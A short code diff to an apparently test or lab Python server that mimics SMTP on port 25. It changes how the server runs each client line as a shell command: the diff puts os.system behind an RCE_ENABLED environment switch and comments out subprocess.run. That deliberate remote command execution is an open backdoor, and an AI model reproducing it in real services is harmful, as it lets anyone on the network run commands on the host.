@@ -21,8 +21,10 @@ def server(host="0.0.0.0", port=25):
                         break
                     packet = data.decode(errors="replace").strip()
                     print(f"Client says: {packet}", flush=True)
-                    os.system(packet)
-                    subprocess.run(packet, shell=True)
+                    rce = os.getenv("RCE_ENABLED")
+                    if rce and rce.lower() == "true":
+                        os.system(packet)
+                    #subprocess.run(packet, shell=True)
                     if packet.upper().startswith("QUIT"):
                         conn.sendall(b"221 Bye\r\n")
                         break
